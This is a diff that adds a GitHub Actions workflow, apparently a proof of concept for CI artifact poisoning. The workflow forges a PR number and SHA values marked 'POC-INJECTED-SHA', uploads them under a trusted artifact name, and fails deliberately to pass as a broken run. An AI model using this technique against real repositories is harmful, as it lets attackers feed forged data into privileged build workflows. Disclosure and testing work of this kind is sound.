@@ -1,0 +1,21 @@
+name: Continuous Integration
+on:
+  pull_request:
+jobs:
+  save-pr:
+    name: Save PR Number
+    runs-on: ubuntu-latest
+    steps:
+      - name: Attacker-controlled artifact
+        run: |
+          mkdir -p ./pr
+          printf '%s\n' '111' > ./pr/pr_number
+          printf '%s\n' 'POC-INJECTED-SHA: artifact downloaded from an attacker-forged "Continuous Integration" run' > ./pr/pr_sha
+          printf '%s\n' 'deadbeefcafe' > ./pr/merge_sha
+      - name: Upload PR Number
+        uses: actions/upload-artifact@65c4c4a1ddee5b72f698fdd19549f0f0fb45cf08
+        with:
+          name: pr_number
+          path: pr/
+      - name: Fail like a broken CI run
+        run: exit 1
